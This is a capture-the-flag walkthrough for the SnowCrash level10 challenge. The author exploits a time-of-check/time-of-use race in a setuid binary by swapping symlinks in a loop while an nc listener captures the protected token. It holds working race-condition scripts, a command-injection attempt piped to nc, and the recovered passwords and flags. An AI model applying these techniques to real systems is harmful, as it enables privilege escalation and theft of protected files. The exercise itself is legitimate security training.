# Okay lets see what we have by doing a ls -la

level10@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token

# Lets see what happens when running the file

level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it

# Lets see whats happens when giving it token

level10@SnowCrash:~$ ./level10 token
./level10 file host
	sends file to host if you have access to it

# Lets see what in token

level10@SnowCrash:~$ cat token
cat: token: Permission denied

# Lets see if we can exploit it with echo and using nc with our port 5151  and give us the password too and 6969 only gives the flag
#	Note localhost 5151 is home in networking
echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe

level10@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
Password: Erf nope..
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

level10@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 6969 && cat /tmp/Gabe
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

# OOPS this did not work. when I enter the password it did not work

# 	Okay but it wasn't a complete waste and we show that we are on the correct path and we need to use port 6969 instead

We decompile on an online tool, and we realize that there is a race condition: If between the call to access and the call to open, 
the file named by argv [1] changes, we can read an arbitrary file.

# So we open a shell on which we listen in loop with the following command:
#	while [42]; do nc-1 6969; therefore

vim listener.sh

#!/bin/sh
while [ 42 ] ; do nc -l 6969; done

# We create a shell script that will try to bruteforce this race condition: It will call the binary between two calls to ln to try to 
#	change the symbolic link running. We see the following password in our second shell:

vim bruteForce.sh
#!/bin/sh
touch /tmp/gabe
  while true; do
       ln -sf /tmp/gabe /tmp/copyToken  &
       /home/user/level10/level10 /tmp/copyToken 127.0.0.1 &
       ln -sf /home/user/level10/token /tmp/copyToken &
  done

# Note you will need 2 terminals conntected to the ssh level10@192.168.56.101 -p 4242
# 	Run the listener.sh first on the one.
#		On the other run bruteforce.sh
#	once you see the below then stop the listener.sh with control c

.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
^C

# The above is your password for the flag10

level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c


Resources
https://linux.die.net/man/1/nc
https://books.google.co.za/books?id=xpSSXvoQBq4C&pg=PA178&lpg=PA178&dq=what+localhost+5151&source=bl&ots=SqC25oe3eL&sig=ytJE2dfwMrG6ZMdjQfLyKKwNoaI&hl=en&sa=X&redir_esc=y#v=onepage&q=what%20localhost%205151&f=false

